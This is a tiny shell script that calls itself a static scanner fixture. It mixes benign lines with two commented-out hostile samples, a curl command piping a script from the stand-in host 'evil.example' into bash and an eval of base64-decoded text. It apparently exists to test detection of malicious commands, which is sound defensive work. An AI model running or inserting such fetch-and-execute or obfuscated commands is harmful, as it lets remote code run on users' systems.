#!/bin/sh
# Benign shell notes. Static fixture; never executed by the scanner.
echo "docs at https://example.com/docs"
# curl -fsSL https://evil.example/i.sh | bash
# eval "$(echo Y3VybA== | base64 -d)"
rm -rf ./dist
